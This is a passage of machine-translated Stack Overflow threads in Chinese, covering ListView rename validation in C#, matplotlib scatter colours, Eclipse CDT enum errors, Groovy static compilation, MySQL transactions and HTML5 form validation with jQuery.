private void button1_Click(object sender, EventArgs e)
{
    if (string.IsNullOrEmpty(textBox1.Text))
        textBox1.Text = "New Role";

    ListViewItem lvi = new ListViewItem(textBox1.Text);
    listViewRoles.Items.Add(lvi);

    lvi.Selected = true;
    lvi.BeginEdit();
}

private void listViewRoles_AfterLabelEdit(object sender, LabelEditEventArgs e)
{
    ListViewItem lvi = listViewRoles.Items[e.Item];
    string newName = e.Label;
    if (newName == null)
        newName = lvi.Text;

    if (!ValidateRoleName(newName, e.Item))
    {
        lvi.BeginEdit();
        return;
    }
}

private void listViewRoles_BeforeLabelEdit(object sender, LabelEditEventArgs e)
{

}

private bool ValidateRoleName(string name, int itemIndex)
{
    const bool validName = true;
    if ((string.IsNullOrEmpty(name.Trim()))) //empty name
    {
        MessageBox.Show(this, "empty role name", "Rename failed");
        return !validName;
    }
    if (NameExists(name, itemIndex)) //name already exists
    {
        MessageBox.Show(this, "already exists", "Rename failed");
        return !validName;
    }

    return validName;
}

private bool NameExists(string newName, int itemIndex)
{
    const bool nameExists = true;

    for (int i = 0; i < listViewRoles.Items.Count; ++i)
    {
        if (itemIndex == i)
            continue;
        if (string.Compare(listViewRoles.Items[i].Text.TrimEnd(), newName.TrimEnd(), true) == 0)
        {
            return nameExists;
        }
    }
    return !nameExists;
} 
```

编辑（来自错位的答案）：

```
private void listViewRoles_AfterLabelEdit(object sender, LabelEditEventArgs e)
{
    ListViewItem lvi = listViewRoles.Items[e.Item];
    string newName = e.Label;
    if (newName == null)
        newName = lvi.Text;

    if (_checkRoleName)
    {
        if (!ValidateRoleName(newName, e.Item))
        {
            _checkRoleName = false;
            lvi.BeginEdit();
            return;
        }
    }
    else
    {
        _checkRoleName = true;
        lvi.BeginEdit();
    }
}

    this.listViewRoles.AfterLabelEdit += new System.Windows.Forms.LabelEditEventHandler(this.listViewRoles_AfterLabelEdit);
    this.listViewRoles.BeforeLabelEdit += new System.Windows.Forms.LabelEditEventHandler(this.listViewRoles_BeforeLabelEdit); 
```

当我尝试上面的代码时，它会在我更改所选索引时显示一次消息框，但当我单击滚动条时，它会调用 AfterLabelEdit 事件，因此消息会调用两次。我需要一个适当的解决方案，如果添加的 listviewitem 已经存在于 listview 中，则添加的 listViewItem 会在编辑模式下持续存在，直到其名称更改或唯一。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:10:05.477

你在错误的事件中打电话

使用“AfterLabelEdit”事件。

[MSDN AfterLabel编辑](http://msdn.microsoft.com/en-us/library/system.windows.forms.listview.afterlabeledit%28v=VS.100%29.aspx#Y0)

# python - 在 matplotlib 中重置已绘制散点的点

> ID：11866872
> 
> 赞同：4
> 
> 时间：2012-08-08T14:35:31.620
> 
> 标签：python, numpy, matplotlib, scipy

如果我在 matplotlib 中有一个散点图，它返回一个 CircleCollection：

`coll = plt.scatter(rand(5), rand(5), c="k")`

如何重置特定点的颜色？我注意到这`coll`是不可迭代的。我只想更改已绘制点的面/边缘颜色，尽管它们已经从初始`plt.scatter`调用中设置了颜色。如何才能做到这一点？

例如：只需更改绘制的第二个点的颜色，例如：

`coll[1].set_color("r") # this does not work, coll not indexable this way`

我知道我可以将颜色向量传递给`c=`in`scatter`但我想稍后有意地重置这些点，因为在`plt.scatter`最初调用时，所有点的颜色都不知道。

*编辑*：进一步解释。我正在寻找根据不同条件为散点图着色的最简单方法。if`points`是一个二维数组，你用 绘制它`scatter(points[:, 0], points[:, 1], c-"k")`，以后根据某些条件方便，例如

```
# replot certain points in red with alpha
selected = points[:, 0] > 0.5
plt.scatter(selected[:, 0], selected[:, 1], c="r", alpha=0.5) 
```

在这里，我重新绘制了旧点，但这很混乱，因为新点是用 alpha 绘制的，所以它不会产生预期的效果。根据哪些点必须重新着色的各种条件可能很复杂，并且发生的时间晚于进行初始散布时，因此仅能够更改现有点的颜色而不是根据拆分点很方便根据条件并分别绘制它们。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:59:00.840

这对我有用。可能您需要`plt.draw`在（或代替）之前调用`fig.show`。

```
coll = plt.scatter(rand(5), rand(5), c="k")
fig = plt.gcf()
fig.show()  # or fig.savefig("a.png")

coll.set_color(['b', 'g', 'r', 'y', 'k'])
fig.show()  # or fig.savefig("b.png") 
```

**更新**

这是如何部分修改颜色。如果在调用时使用单一颜色，则需要`colors`显式扩展数组`scatter`。

```
num = 5
coll = plt.scatter(rand(num), rand(num), c='k')
# coll = plt.scatter(rand(num), rand(num), c=['b', 'g', 'r', 'y', 'k'])
fig = plt.gcf()
fig.show()

colors = coll.get_facecolor()
if colors.shape[0] == 1:
    newcolors = np.tile(colors, (num, 1))
else:
    newcolors = colors
newcolors[0] = [0, 0.75, 0.75, 1]
coll.set_color(newcolors) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-09T00:38:32.277

当您调用时`scatter`，将每个点传递一个颜色，然后您可以`_facecolors`直接更改 ndarray。

```
from matplotlib import pyplot as plt
from matplotlib.collections import PathCollection
from numpy.random import rand
x = rand(5)
y = rand(5)
coll = plt.scatter(x, y, c=["k"]*len(x)) # must set color for every point
coll._facecolors[2,:] = (1, 0, 0, 1)
plt.show() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:46:18.497

您需要使用单独的列表：

```
plt.scatter(x1, y1, c='b')
plt.scatter(x2, y2, c='k') 
```

看看[这个](http://matplotlib.sourceforge.net/api/pyplot_api.html#matplotlib.pyplot.scatter)。

您还可以在 c 中创建一个与 x 和 y 长度相同的列表。

# c++ - Eclipse CDT C++ 枚举“无法解析”

> ID：11866873
> 
> 赞同：6
> 
> 时间：2012-08-08T14:35:31.960
> 
> 标签：c++, eclipse, enums, eclipse-cdt

我正在用 C++/OpenGL 的 Eclipse CDT 开发一个游戏，它编译和运行得很好，但由于某种原因，我声明的枚举 (SCREEN_MAIN_MENU) 用红色曲线加下划线并突出显示符号 SCREEN_MAIN_MENU 无法解决. 这是一个明目张胆的谎言，我如何让 Eclipse 识别它？

屏幕.h：

```
#ifndef SCREENS_H
#define SCREENS_H

enum {
SCREEN_MAIN_MENU,
SCREEN_LOADING,
SCREEN_GAME
};

class Screen{
public:
    static void change(int screen);
    static void render();
};

#endif 
```

屏幕.cpp：

```
#include "screens.h"
#include "gui.h"
#include "global.h"

extern Global global;

void Screen::change(int screen){
    global.screen = screen;
}

void Screen::render(){
if(global.screen == SCREEN_MAIN_MENU){ //HERE ARE THE RED SQUIGGLES!!!??
    global.text_renderer.print("Sidona", global.screen_width/2-40,
    global.screen_height-25);
    Gui::render();
    }
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-27T08:17:04.373

这可能是由 Eclipse CDT 中的错误引起的：

[https://bugs.eclipse.org/bugs/show_bug.cgi?id=356057](https://bugs.eclipse.org/bugs/show_bug.cgi?id=356057)

尝试重建索引（右键项目->索引->重建）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:45:34.673

您是否尝试过为枚举创建命名类型？

IE

```
enum SCREEN_TYPE {  SCREEN_MAIN_MENU, SCREEN_LOADING, SCREEN_GAME }; 
```

# c# - 在代码优先中映射枚举

> ID：11866880
> 
> 赞同：2
> 
> 时间：2012-08-08T14:36:02.057
> 
> 标签：c#, enums, ef-code-first

> **可能重复：**
> [使用 EF 代码优先的枚举 - 播种 DB 然后使用的标准方法？](https://stackoverflow.com/questions/6344032/enums-with-ef-code-first-standard-method-to-seeding-db-and-then-using)

有没有一种简单的方法来使用代码优先 EF 映射枚举。

这是我的 poco 类.. FooStatus 是一个枚举。初始化数据库时未创建该列。

```
public class Foo
{
    public int Id { get; set; }
    [Required]
    public string Title { get; set; }
    [Required]
    public string Description { get; set; }

    public int CreatorId { get; set; }

    public Creator Creator { get; set; }

    public FooStatus Status { get; set; }

    public int Applications { get; set; }

} 
```

# javascript - 多 iframe 页面中注入的 JS 文件在哪里？-浏览器扩展

> ID：11866890
> 
> 赞同：0
> 
> 时间：2012-08-08T14:36:38.627
> 
> 标签：javascript, jquery, google-chrome, google-chrome-extension

在 Chrome 扩展程序中：

如何检查在多 iframe 页面的哪个 iframe 中注入了内容脚本？

例如，将内容脚本注入 Gmail 后，如何检查 iframe 的真正位置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:22:23.460

取决于您的清单文件，尤其是content_scripts 的**all_frames**属性。

```
 "content_scripts": [
    {
        "all_frames": true/false
    } 
```

如果 all_frames = false，它不会注入任何 iframe，因为它只注入顶部 iframe，即文档。如果 all_frames = true，它会注入所有 iframe。[请参阅文档。](http://developer.chrome.com/extensions/content_scripts)

# jquery - 为单个文本框使用多个 jquery 自动完成数据源

> ID：11866898
> 
> 赞同：0
> 
> 时间：2012-08-08T14:37:05.283
> 
> 标签：jquery, jquery-autocomplete

我想为单个文本框使用多个 jQuery 自动完成，其中每个自动完成的数据源都不同。我有两个数据源，一个应该在文本框中输入 @ 时使用，另一个在文本框中输入 > 后使用。

例如：

```
// Datasource1 
country = {[name:india, displayname:GreatIndia] [name:china , displayName:BigChina] [name:usa , displayname:unitedstates }

// Datasource2 
colors = {[colorName:Red , Statistic:Dark] [colorName:blue , Statistic:calm] [colorName:Green , Statistic:Cool] } 
```

如果我输入“@In”，它会显示 India，GreatIndia，如果我输入“@Gr”，它也必须在文本框中显示 India，GreatIndia。

同样，对于相同的文本框，如果我键入“>bl”，它应该显示为蓝色，平静

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:07:50.087

这可能不是一个完美的答案，但它可以作为一个起点。

我还没有测试过这个，但你可以做这样的网址吗？

```
 $("#id").autocomplete({
            source: function (request, response) {
                   $.ajax({
                     url: function(request.term),
                     dataType: "json",
                     data: {
                          filter: request.term
                     },
                     success: function (data) {
                         //do something
                     }
             })
             },
              select: function (event, ui) {
                  //do something            
             }
});    

function(term)
{
   //implement logic that  
   //returns a string url
} 
```

*（前几天我有一个[类似](https://stackoverflow.com/questions/11579828/jqgrid-during-modal-initialization-how-would-i-determine-what-model-is-being-c)的场景（你的不同之处在于必须使用组件本身动态设置 url））*

# groovy - Groovy 静态编译是否有任何全局标志？

> ID：11866901
> 
> 赞同：12
> 
> 时间：2012-08-08T14:37:14.227
> 
> 标签：groovy, static, compilation

我知道从 Groovy 2.0 开始就有了静态编译的注解。但是，很容易意外地忽略此类注释，但仍然会遇到麻烦。

有什么方法可以实现相反的编译器行为，例如默认编译静态所有项目文件，并使用某种 @CompileDynamic 注释编译仅动态选择的文件？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2015-05-18T15:20:18.143

我发现了一些（我相信是最近引入的）特性，它允许使用 Gradle 这样做。

在包含 groovy 源的项目的*build.gradle*文件中，我们需要添加以下行：

```
compileGroovy {
    configure(groovyOptions) {
        configurationScript = file("$rootDir/config/groovy/compiler-config.groovy")
    }
} 
```

或`compileTestGroovy { ...`将其应用于测试源。请记住，静态编译和类型检查都不适用于 Spock 框架。Spock 本质上使用了很多动态的“groovyness”。

然后在项目的根目录下创建文件夹*config/groovy/*和一个名为*compiler-config.groovy*的文件。文件内容如下：

```
import groovy.transform.CompileStatic

withConfig(configuration) {
    ast(CompileStatic)
} 
```

*显然配置*脚本的路径和名称可能会有所不同，这取决于您。它不应该转到同一个*src/main/groovy*，因为它会混合完全不同的关注点。

当然，同样可以使用`groovy.transform.TypeChecked`或任何其他注释来完成。

为了反转某些类或方法上的应用行为，可以使用`@CompileDynamic`注释或分别。`@TypeChecked(TypeCheckingMode.SKIP)`

当没有 Gradle 用作构建工具时，我不确定如何实现相同的目标。不过，我将来可能会使用此类信息更新此答案。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-08T14:40:50.257

目前还没有，但这里有一个[未解决的 Jira 问题，](http://jira.codehaus.org/browse/GROOVY-5503)您可以关注此功能的进展情况

[在 Groovy 开发人员列表上](http://groovy.329449.n5.nabble.com/Type-checking-by-default-and-other-variants-td5710513.html)也有关于执行此操作的方法的讨论

# mysql - 将事务分组在一个存储过程中，还是分成两个存储过程？

> ID：11866908
> 
> 赞同：0
> 
> 时间：2012-08-08T14:37:39.297
> 
> 标签：mysql, database, database-design

我有一个复杂的网站，用真钱处理在线游戏。我为我的交易使用了复式数据库设计，一个简单的例子如下：

John 存入 5 美元 John 收到 5000 个积分 John 使用这 5000 个积分玩游戏。

数据库中的事务如下所示：

```
trans_id | account_id  | trans_type | date | amount |
-----------------------------------------------------
1        | John(PayPal)| Debit      | date | -5.00  |
2        | System      | Credit     | date |  5.00  |
3        | SystemGame  | Debit      | date | -5000  |
4        | JohnGame    | Credit     | date |  5000  | 
```

我编写了一个包含事务的存储过程，其中插入了事务 1 和 2、来自 John 的 PayPal 帐户的借记以及对我们系统帐户的贷记。

我的问题是，我是否还应该包括约翰从我们的 SystemGame 账户转移资金到他的游戏账户的其他交易？或者我应该为每组事务都有一个存储过程？所有 4 笔交易同时发生，John 在存入 5 美元后立即记入贷方。

另外，我应该将游戏积分的交易表与真实货币交易表分开吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:50:16.057

我想这就是你想要的。但我建议您进行 2 次不同的交易来区分游戏内货币和真实货币。

唯一的原因是，如果将来您需要更改游戏内资金管理或真实资金管理，您可以单独进行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T15:14:53.427

事务必须是原子的：必须完成所有步骤。如果一个失败，一切都会回滚。

如果您提到的这 4 个步骤必须一次全部完成，则它们必须在一个事务中。

所以，对我来说，你目前的方法是可以的。

但是，如果您想将事物拆分为 2 个存储过程，您可以使用您使用的语言（PHP、C#）管理事务。

检查这个：[MySQL 中的事务 - 无法回滚](https://stackoverflow.com/questions/5332374/transactions-in-mysql-unable-to-roll-back)，这个：[PHP + MySQL 事务示例](https://stackoverflow.com/questions/2708237/php-mysql-transactions-examples)

# jquery - 如何在不通过 jQuery 提交的情况下强制进行 html5 表单验证

> ID：11866910
> 
> 赞同：321
> 
> 时间：2012-08-08T14:37:43.427
> 
> 标签：jquery, html, validation

我的应用程序中有这个表单，我将通过 AJAX 提交它，但我想使用 HTML5 进行客户端验证。所以我希望能够强制表单验证，也许是通过 jQuery。

我想在不提交表单的情况下触发验证。是否可以？

* * *

## 回答 #1

> 赞同：481
> 
> 时间：2012-08-08T14:42:42.850

要检查某个字段是否有效，请使用：

```
$('#myField')[0].checkValidity(); // returns true|false 
```

要检查表单是否有效，请使用：

```
$('#myForm')[0].checkValidity(); // returns true|false 
```

如果您想显示某些浏览器（例如 Chrome）的本机错误消息，不幸的是，唯一的方法是提交表单，如下所示：

```
var $myForm = $('#myForm');

if (!$myForm[0].checkValidity()) {
    // If the form is invalid, submit it. The form won't actually submit;
    // this will just cause the browser to display the native HTML5 error messages.
    $myForm.find(':submit').click();
} 
```

请记住，到目前为止，并非所有浏览器都支持 HTML5 验证。

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2019-06-24T12:39:34.887

下面的代码对我有用，

```
$("#btn").click(function () {

    if ($("#frm")[0].checkValidity())
        alert('sucess');
    else
        //Validate Form
        $("#frm")[0].reportValidity()

}); 
```

* * *

## 回答 #3

> 赞同：38
> 
> 时间：2013-02-06T16:42:47.807

我发现这个解决方案对我有用。只需像这样调用一个javascript函数：

`action="javascript:myFunction();"`

然后你就有了 html5 验证......真的很简单:-)

* * *

## 回答 #4

> 赞同：33
> 
> 时间：2015-07-15T10:15:40.707

```
 if $("form")[0].checkValidity()
      $.ajax(
        url: "url"
        type: "post"
        data: {

        }
        dataType: "json"
        success: (data) ->

      )
    else
      #important
      $("form")[0].reportValidity() 
```

来自：[html5表单验证](http://zhishu.huati365.com/read/HTML/%E5%9C%A8Ajax%E8%AF%B7%E6%B1%82%E4%B8%AD%E4%BD%BF%E7%94%A8HTML5%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81)

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2013-02-27T16:38:27.753

这是一种更通用的方式，更简洁：

像这样创建你的表单（可以是一个什么都不做的虚拟表单）：

```
<form class="validateDontSubmit">
... 
```

绑定您不想提交的所有表单：

```
$(document).on('submit','.validateDontSubmit',function (e) {
    //prevent the form from doing a submit
    e.preventDefault();
    return false;
}) 
```

现在假设您有一个`<a>`（在 内`<form>`）单击时要验证表单：

```
$('#myLink').click(function(e){
  //Leverage the HTML5 validation w/ ajax. Have to submit to get em. Wont actually submit cuz form
  //has .validateDontSubmit class
  var $theForm = $(this).closest('form');
  //Some browsers don't implement checkValidity
  if (( typeof($theForm[0].checkValidity) == "function" ) && !$theForm[0].checkValidity()) {
     return;
  }

  //if you've gotten here - play on playa'
}); 
```

这里有几点注意事项：

*   我注意到您不必实际提交表单以进行验证 - 调用`checkValidity()`就足够了（至少在 chrome 中）。如果其他人可以通过在其他浏览器上测试该理论来添加评论，我将更新此答案。
*   触发验证的东西不必在`<form>`. 这只是拥有通用解决方案的一种干净而灵活的方式。

* * *

## 回答 #6

> 赞同：15
> 
> 时间：2016-09-13T12:23:35.510

聚会可能迟到了，但不知何故我在尝试解决类似问题时发现了这个问题。由于此页面中没有代码对我有用，同时我想出了按规定工作的解决方案。

问题是当您的`<form>`DOM 包含单个`<button>`元素时，一旦触发，`<button>`它将自动汇总表单。如果您使用 AJAX，您可能需要防止默认操作。但是有一个问题：如果你这样做，你也会阻止基本的 HTML5 验证。因此，仅当表单有效时才阻止该按钮上的默认值是一个很好的调用。否则，HTML5 验证将保护您无法提交。jQuery`checkValidity()`将对此有所帮助：

jQuery：

```
$(document).ready(function() {
  $('#buttonID').on('click', function(event) {
    var isvalidate = $("#formID")[0].checkValidity();
    if (isvalidate) {
      event.preventDefault();
      // HERE YOU CAN PUT YOUR AJAX CALL
    }
  });
}); 
```

上述代码将允许您在不提交表单的情况下使用基本的 HTML5 验证（类型和模式匹配）。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2012-08-08T14:44:38.200

您谈到了两个不同的事情“HTML5 验证”和使用 javascript/jquery 验证 HTML 表单。

HTML5“具有”用于验证表单的内置选项。例如在字段上使用“必需”属性，这可能（基于浏览器实现）在不使用 javascript/jquery 的情况下使表单提交失败。

使用 javascrip/jquery 你可以做这样的事情

```
$('your_form_id').bind('submit', function() {
   // validate your form here
   return (valid) ? true : false;
}); 
```

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2016-12-21T07:43:06.523

```
var $myForm = $('#myForm ');
if (!$myForm[0].checkValidity()) {
  $('<input type="submit">').hide().appendTo($myForm).click().remove();
} 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2013-10-04T06:35:27.530

要在不使用提交按钮的情况下检查表单的所有必填字段，您可以使用以下功能。

您必须为控件分配**必需**的属性。

```
 $("#btnSave").click(function () {
    $(":input[required]").each(function () {                     
        var myForm = $('#form1');
        if (!$myForm[0].checkValidity()) 
          {                
            $(myForm).submit();              
          }
        });
  }); 
```

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2016-03-19T20:31:56.077

你不需要 jQuery 来实现这一点。在您的表单中添加：

```
onsubmit="return buttonSubmit(this) 
```

或在 JavaScript 中：

```
myform.setAttribute("onsubmit", "return buttonSubmit(this)"); 
```

在您的`buttonSubmit`函数（或任何您称之为的函数）中，您可以使用 AJAX 提交表单。`buttonSubmit`只有当您的表单在 HTML5 中经过验证时才会被调用。

如果这对任何人都有帮助，这是我的`buttonSubmit`功能：

```
function buttonSubmit(e)
{
    var ajax;
    var formData = new FormData();
    for (i = 0; i < e.elements.length; i++)
    {
        if (e.elements[i].type == "submit")
        {
            if (submitvalue == e.elements[i].value)
            {
                submit = e.elements[i];
                submit.disabled = true;
            }
        }
        else if (e.elements[i].type == "radio")
        {
            if (e.elements[i].checked)
                formData.append(e.elements[i].name, e.elements[i].value);
        }
        else
            formData.append(e.elements[i].name, e.elements[i].value);
    }
    formData.append("javascript", "javascript");
    var action = e.action;
    status = action.split('/').reverse()[0] + "-status";
    ajax = new XMLHttpRequest();
    ajax.addEventListener("load", manageLoad, false);
    ajax.addEventListener("error", manageError, false);
    ajax.open("POST", action);
    ajax.send(formData);
    return false;
} 
```

我的一些表单包含多个提交按钮，因此这一行`if (submitvalue == e.elements[i].value)`。我设置了`submitvalue`使用点击事件的值。

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2018-09-17T06:23:35.430

这种方式对我很有效：

1.  在您的 中添加`onSubmit`属性`form`，不要忘记包含`return`在值中。

    ```
    <form id='frm-contact' method='POST' action='' onSubmit="return contact()"> 
    ```

2.  定义函数。

    ```
    function contact(params) {
        $.ajax({
            url: 'sendmail.php',
            type: "POST",
            dataType: "json",
            timeout: 5000,
            data: { params:params },
            success: function (data, textStatus, jqXHR) {
                // callback
            },
            error: function(jqXHR, textStatus, errorThrown) {
                console.log(jqXHR.responseText);
            }
        });

        return false;
    } 
    ```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2014-02-10T01:05:46.893

我有一个相当复杂的情况，我需要多个提交按钮来处理不同的事情。例如，保存和删除。

基础是它也不显眼，所以我不能让它成为一个普通的按钮。但也想利用 html5 验证。

在用户按下回车键触发预期的默认提交的情况下，提交事件也会被覆盖；在这个例子中保存。

这是处理表单的努力，无论是否使用 javascript 和 html5 验证，提交和点击事件。

> **[jsFiddle Demo - 带有提交和点击覆盖的 HTML5 验证](http://jsfiddle.net/TXGry/)**

**xHTML**

```
<form>
    <input type="text" required="required" value="" placeholder="test" />
    <button type="submit" name="save">Save</button>
    <button type="submit" name="delete">Delete</button>
</form> 
```

**JavaScript**

```
//wrap our script in an annonymous function so that it can not be affected by other scripts and does not interact with other scripts
//ensures jQuery is the only thing declared as $
(function($){
    var isValid = null;
    var form = $('form');
    var submitButton = form.find('button[type="submit"]')
    var saveButton = submitButton.filter('[name="save"]');
    var deleteButton = submitButton.filter('[name="delete"]');

    //submit form behavior
    var submitForm = function(e){
        console.log('form submit');
        //prevent form from submitting valid or invalid
        e.preventDefault();
        //user clicked and the form was not valid
        if(isValid === false){
            isValid = null;
            return false;
        }
        //user pressed enter, process as if they clicked save instead
        saveButton.trigger('click');
    };

    //override submit button behavior
    var submitClick = function(e){
        //Test form validitiy (HTML5) and store it in a global variable so both functions can use it
        isValid = form[0].checkValidity();
        if(false === isValid){
            //allow the browser's default submit event behavior 
            return true;
        }
        //prevent default behavior
        e.preventDefault();
        //additional processing - $.ajax() etc
        //.........
        alert('Success');
    };

    //override submit form event
    form.submit(submitForm);

    //override submit button click event
    submitButton.click(submitClick);
})(jQuery); 
```

使用 Javascript 的警告是浏览器的默认 onclick 必须传播到提交事件必须发生，以便在不支持代码中的每个浏览器的情况下显示错误消息。否则，如果 click 事件被 event.preventDefault() 覆盖或返回 false，它将永远不会传播到浏览器的提交事件。

需要指出的是，在某些浏览器中，当用户按下回车键时不会触发表单提交，而是会触发表单中的第一个提交按钮。因此有一个 console.log('form submit') 表明它没有触发。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2014-02-14T06:37:08.517

您可以在不提交表单的情况下执行此操作。

例如，如果 id 为“search”的表单提交按钮在另一个表单中。您可以在该提交按钮上调用 click 事件，然后调用 ev.preventDefault 。对于我的情况，我从表单 A 提交中验证表单 B。像这样

```
function validateFormB(ev){ // DOM Event object
  //search is in Form A
  $("#search").click();
  ev.preventDefault();
  //Form B validation from here on
} 
```

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2022-02-17T12:15:10.717

## 2022香草JS解决方案

纯 JavaScript 具有您需要的所有功能。我知道这个问题是关于 jQuery 的，但我确信我不是唯一一个在这里搜索 vanilla JS 解决方案的人，所以这就是我发现的。

### 测试整个表格

```
let form = document.getElementById('formId');
// Eventlistener can be another event and on another DOM object this is just an example
form.addEventListener('submit', function (event) {
    // Only needed if event is submit, otherwise this line can be skipped 
    event.preventDefault();

    // This is the important part, test if form is valid
    if (form.checkValidity() === false){
        // This is the magic function that displays the validation errors to the user
        form.reportValidity();   
        return; 
    }

    // Code if all fields are valid; continue form submit or make Ajax call.
}) 
```

### 测试特定字段

`checkValidity()`并且`reportValidity()`不仅可以在表单上使用，还可以在特定字段上使用。如果不需要，无需创建表单或虚拟提交按钮。

```
// Get field of interest
let inputElement = document.querySelector("[name='" + inputName + "']");
// Check if the element is valid
if (inputElement.checkValidity() === false){
    // If not, show the errors to the user
    inputElement.reportValidity();
    return;
}

// Nothing? Great, continue to the Ajax call or whatever 
```

显然，这必须在事件侦听器调用的函数中才有意义。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2015-04-22T04:11:05.573

```
$("#form").submit(function() { $("#saveButton").attr("disabled", true); }); 
```

不是最佳答案，但对我有用。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2015-07-31T04:53:29.123

我知道这已经得到解答，但我有另一种可能的解决方案。

如果使用 jquery，你可以这样做。

首先在 jquery 上创建几个扩展，以便您可以根据需要重新使用它们。

```
$.extend({
    bypassDefaultSubmit: function (formName, newSubmitMethod) {
        $('#'+formName).submit(function (event) {
            newSubmitMethod();
            event.preventDefault();
        }
    }
}); 
```

接下来在你想使用它的地方做这样的事情。

```
<script type="text/javascript">
    /*if you want to validate the form on a submit call, 
      and you never want the form to be submitted via
      a normal submit operation, or maybe you want handle it.
    */
    $(function () {
        $.bypassDefaultSubmit('form1', submit);
    });
    function submit(){ 
        //do something, or nothing if you just want the validation
    }

</script> 
```

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2015-12-19T05:49:34.763

```
$(document).on("submit", false);

submitButton.click(function(e) {
    if (form.checkValidity()) {
        form.submit();
    }
}); 
```

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2016-11-19T10:31:19.650

这使我可以**通过表单验证显示本机 HTML 5 错误消息。**

```
<button id="btnRegister" class="btn btn-success btn btn-lg" type="submit"> Register </button>

$('#RegForm').on('submit', function () 
{

if (this.checkValidity() == false) 
{

 // if form is not valid show native error messages 

return false;

}
else
{

 // if form is valid , show please wait message and disable the button

 $("#btnRegister").html("<i class='fa fa-spinner fa-spin'></i> Please Wait...");

 $(this).find(':submit').attr('disabled', 'disabled');

}

}); 
```

**注意：** RegForm 是`form id`.

[参考](https://stackoverflow.com/a/26524497/2218697)

希望能帮助某人。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2016-12-14T22:40:58.687

这是让 HTML5 对任何表单执行验证的一种非常直接的方式，同时仍然让现代 JS 控制表单。唯一需要注意的是提交按钮必须在`<form>`.

html

```
<form id="newUserForm" name="create">
Email<input type="email" name="username" id="username" size="25" required>
Phone<input type="tel" id="phone" name="phone" pattern="(?:\(\d{3}\)|\d{3})[- ]?\d{3}[- ]?\d{4}" size="12" maxlength="12" required>
<input id="submit" type="submit" value="Create Account" >
</form> 
```

js

```
// bind in ready() function
jQuery( "#submit" ).click( newAcctSubmit );

function newAcctSubmit()
{
  var myForm = jQuery( "#newUserForm" );

  // html 5 is doing the form validation for us,
  // so no need here (but backend will need to still for security)
  if ( ! myForm[0].checkValidity() )
  {
    // bonk! failed to validate, so return true which lets the
    // browser show native validation messages to the user
    return true;
  }

  // post form with jQuery or whatever you want to do with a valid form!
  var formVars = myForm.serialize();
  etc...
} 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2019-05-29T08:02:42.220

我认为最好的方法

将使用[jQuery Validation](https://jqueryvalidation.org)插件，该插件使用最佳实践进行表单验证，并且它还具有良好的浏览器支持。因此您无需担心浏览器兼容性问题。

我们可以使用 jQuery 验证[valid()](https://jqueryvalidation.org/valid/)函数来检查选定的表单是否有效，或者是否所有选定的元素都有效，而无需提交表单。

```
<form id="myform">
   <input type="text" name="name" required>
   <br>
   <button type="button">Validate!</button>
</form>
<script>
  var form = $( "#myform" );
  form.validate();
  $( "button" ).click(function() {
    console.log( "Valid: " + form.valid() );
  });
</script> 
```

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2019-07-03T11:03:22.380

根据问题html5有效性应该首先使用jQuery进行验证，并且在大多数答案中这没有发生，原因如下：

在使用 html5 表单的默认功能进行验证时

```
checkValidity();// returns true/false 
```

我们需要了解jQuery返回对象数组，同时像这样选择

```
$("#myForm") 
```

因此，您需要指定第一个索引以使 checkValidity() 函数工作

```
$('#myForm')[0].checkValidity() 
```

这是完整的解决方案：

```
<button type="button" name="button" onclick="saveData()">Save</button>

function saveData()
{
    if($('#myForm')[0].checkValidity()){
        $.ajax({
          type: "POST",
          url: "save.php",
          data: data,
          success: function(resp){console.log("Response: "+resp);}
        });
    }
} 
```

# iphone - 自定义 UIBarButtonItem 突出显示问题

> ID：11866912
> 
> 赞同：1
> 
> 时间：2012-08-08T14:37:47.967
> 
> 标签：iphone, objective-c, ios4

我有一个带有 5 个按钮的工具栏。

其中 4 个是常规条形按钮项，其中一个是自定义项（“UIBarButtonItem”中的“UIButton”）。

我注意到，当我在常规按钮（不完全是它们）之间单击时，其中一个（最接近的）仍然会收到单击事件并被突出显示（这就是我想要的）。

但自定义栏按钮项不显示此行为。

当我在它和常规按钮之一之间点击时，这两个按钮都没有收到触摸事件。这可能是因为它`UIButton`是获得点击事件的那个。有没有办法在包含栏按钮项目中添加触摸事件？或者也许是另一种解决这个问题的方法？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:49:45.580

`button.userInteractionEnabled = YES;`我相信就是答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:57:36.910

一种解决方案可能是您创建与条形按钮项目相同的图像并将 UIButton 指定为背景图像，这将解决您的问题。

希望这可以帮助你....

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T07:35:59.750

